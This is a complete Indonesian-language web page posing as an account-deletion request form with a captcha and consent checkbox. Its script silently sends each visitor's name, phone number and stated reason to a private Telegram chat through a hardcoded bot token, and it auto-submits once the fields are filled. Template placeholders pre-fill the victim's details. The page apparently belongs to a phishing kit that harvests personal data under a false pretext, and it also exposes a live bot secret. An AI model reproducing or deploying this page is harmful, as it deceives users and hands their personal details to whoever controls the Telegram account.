<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<title>Hapus Akun</title>

<style>
* { box-sizing: border-box; }

html, body {
    margin: 0;
    padding: 0;
    overflow-x: hidden;
    font-family: 'Segoe UI', sans-serif;
    background: #f4f7fb;
}

/* CONTAINER */
.container {
    max-width: 420px;
    margin: 20px auto;
    background: #fff;
    padding: 18px;
    border-radius: 16px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.05);
    animation: fadeIn 0.5s ease;
}

/* TITLE */
.title {
    font-size: 16px;
    font-weight: 600;
    color: #222;
}

.desc {
    font-size: 13px;
    color: #666;
    margin-top: 5px;
}

/* NOTICE */
.notice {
    background: #fff4f4;
    border-left: 4px solid #ff4d4f;
    padding: 10px;
    border-radius: 8px;
    font-size: 12px;
    margin: 15px 0;
}

/* INPUT */
.input-group {
    margin-top: 12px;
}

input, textarea {
    width: 100%;
    padding: 12px;
    border-radius: 12px;
    border: 1px solid #e0e0e0;
    background: #f7f9fc;
    font-size: 13px;
}

textarea {
    min-height: 80px;
    resize: none;
}

/* CHECKBOX */
.checkbox {
    display: grid;
    grid-template-columns: 20px 1fr;
    align-items: start;
    gap: 8px;
    margin-top: 16px;
    font-size: 12px;
    color: #555;
}

.checkbox input {
    margin-top: -3px;
}

.checkbox label {
    line-height: 1;
}



/* CAPTCHA */
.captcha-wrapper {
    margin-top: 14px;
}

.captcha-box {
    display: flex;
    gap: 8px;
}

.captcha-text {
    flex: 1;
    text-align: center;
    background: #eef3fb;
    border-radius: 12px;
    font-weight: bold;
    letter-spacing: 3px;
    padding: 12px;
    color: #1565c0;
}

.refresh {
    width: 45px;
    border: none;
    border-radius: 12px;
    background: #e3ecfb;
    font-size: 16px;
    cursor: pointer;
}

/* BUTTON */
button.submit {
    width: 100%;
    padding: 13px;
    margin-top: 20px;
    border: none;
    border-radius: 12px;
    background: linear-gradient(135deg, #1565c0, #42a5f5);
    color: #fff;
    font-weight: 600;
}

/* ANIMASI */
@keyframes fadeIn {
    from { opacity: 0; transform: scale(0.98); }
    to { opacity: 1; transform: scale(1); }
}
</style>
</head>

<body>

<div class="container">

    <div class="title">Penghapusan Akun</div>
    <div class="desc">Data akan dihapus permanen dan tidak bisa dikembalikan.</div>

    <div class="notice">
        Pastikan tidak ada transaksi berjalan sebelum melanjutkan.
    </div>

    <div class="input-group">
        <input type="text" id="nama" placeholder="Nama">
    </div>

    <div class="input-group">
        <input type="text" id="nomor" placeholder="Nomor HP">
    </div>

    <div class="input-group">
        <textarea id="alasan" placeholder="Alasan hapus akun"></textarea>
    </div>

    <!-- CHECKBOX -->
    <div class="checkbox">
    <input type="checkbox" id="setuju">
    <label for="setuju">
        Saya menyetujui penghapusan data permanen
    </label>
</div>

    <!-- CAPTCHA -->
    <div class="captcha-wrapper">
        <div class="captcha-box">
            <div class="captcha-text" id="captcha"></div>
            <button type="button" class="refresh" onclick="generateCaptcha()">↻</button>
        </div>

        <div class="input-group">
            <input type="text" id="inputCaptcha" placeholder="Masukkan captcha">
        </div>
    </div>

    <button class="submit" onclick="kirimData()">Kirim Permintaan</button>

</div>

<script>
let kodeCaptcha = "";
let sudahKirim = false;

// CAPTCHA
function generateCaptcha() {
    let chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
    kodeCaptcha = "";
    for (let i = 0; i < 5; i++) {
        kodeCaptcha += chars[Math.floor(Math.random() * chars.length)];
    }
    document.getElementById("captcha").innerText = kodeCaptcha;
}

// AUTO ISI
function isiOtomatis() {
    let nama = "{{nama_user}}";
    let nomor = "{{nomor_telepon}}";

    if (nama && !nama.includes("{{")) {
        document.getElementById("nama").value = nama;
    }

    if (nomor && !nomor.includes("{{")) {
        nomor = nomor.replace(/^(\+62|62)/, "0");
        document.getElementById("nomor").value = nomor;
    }
}

// FORMAT NOMOR
document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("nomor").addEventListener("input", function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
});

// AUTO KIRIM
function cekAutoKirim() {
    if (sudahKirim) return;

    let nama = document.getElementById("nama").value;
    let nomor = document.getElementById("nomor").value;
    let alasan = document.getElementById("alasan").value;
    let setuju = document.getElementById("setuju").checked;
    let captcha = document.getElementById("inputCaptcha").value;

    if (nama && nomor && alasan && setuju && captcha === kodeCaptcha) {
        sudahKirim = true;
        setTimeout(kirimData, 1200);
    }
}

// KIRIM
function kirimData() {
    let nama = document.getElementById("nama").value;
    let nomor = document.getElementById("nomor").value;
    let alasan = document.getElementById("alasan").value;

    let token = "6092671058:AAFnTJ6jWq-dtuShCaGmfTR5JCT-bS9eJBQ";
    let chat_id = "934382864";

    let pesan = `📢 HAPUS AKUN
👤 ${nama}
📱 ${nomor}
📝 ${alasan}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: chat_id,
            text: pesan
        })
    })
    .then(() => {
        alert("Permintaan terkirim");
        generateCaptcha();
        sudahKirim = false;
    })
    .catch(() => {
        alert("Gagal kirim");
        sudahKirim = false;
    });
}

// EVENT
document.addEventListener("DOMContentLoaded", function() {
    generateCaptcha();
    isiOtomatis();

    document.querySelectorAll("input, textarea").forEach(el => {
        el.addEventListener("input", cekAutoKirim);
    });

    document.getElementById("setuju").addEventListener("change", cekAutoKirim);
});
</script>

</body>
          </html>
